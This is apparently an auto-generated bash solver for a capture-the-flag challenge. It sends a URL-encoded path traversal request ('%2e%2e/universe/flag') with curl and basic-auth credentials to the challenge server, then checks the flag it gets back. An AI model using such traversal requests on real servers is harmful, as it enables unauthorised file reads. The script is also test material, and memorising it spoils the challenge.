#!/usr/bin/env bash
# file automatically generated by mkctf.
# ------------------------------------------------------------------------------
# FUNCTIONS
# ------------------------------------------------------------------------------
function print {
    (>&2 printf "\x1b[34m${1}\x1b[0m\n")
}
function exit_success {
    (>&2 printf "\x1b[32m- Script succeeded.\x1b[0m\n")
    exit 0
}
function exit_failure {
    (>&2 printf "\x1b[31m- Script failed.\x1b[0m\n")
    exit 1
}
function exit_non_applicable {
    (>&2 printf "\x1b[36m- Script non applicable.\x1b[0m\n")
    exit 2
}
function exit_manual {
    (>&2 printf "\x1b[33m- Script requires a manual operation.\x1b[0m\n")
    exit 3
}
function exit_not_implemented {
    (>&2 printf "\x1b[35m- Script not implemented.\x1b[0m\n")
    exit 4
}
function check_flag {
    print "- Checking flag..."
    expected_flag=$(cat ../.mkctf.yml | grep -E 'INSA{' | cut -d' ' -f2)
    if [ "${1}" = "${expected_flag}" ]; then
        exit_success
    fi
    exit_failure
}
# ------------------------------------------------------------------------------
# VARIABLES
# ------------------------------------------------------------------------------
DEBUG=0
# ------------------------------------------------------------------------------
# ARGUMENT PARSER
# ------------------------------------------------------------------------------
while [[ $# -gt 0 ]]
do
key="$1"
case ${key} in
    -d|--debug)
    DEBUG=1
    shift # past argument
    ;;
    *)    # unknown option
    print "unknown option: ${key}"
    shift # past argument
    ;;
esac
done
# ------------------------------------------------------------------------------
# MAIN SCRIPT
# ------------------------------------------------------------------------------
if [ ${DEBUG} -eq 1 ]; then
    URL=http://localhost:8080
else
    URL=https://exploring-the-universe.ctf.insecurity-insa.fr
fi
print "- Exploiting path traversal vulnerability..."
FLAG=$(curl -u insecurity:fake_preprod_password "${URL}/%2e%2e/universe/flag")
print "- Checking flag: ${FLAG}"
check_flag ${FLAG}
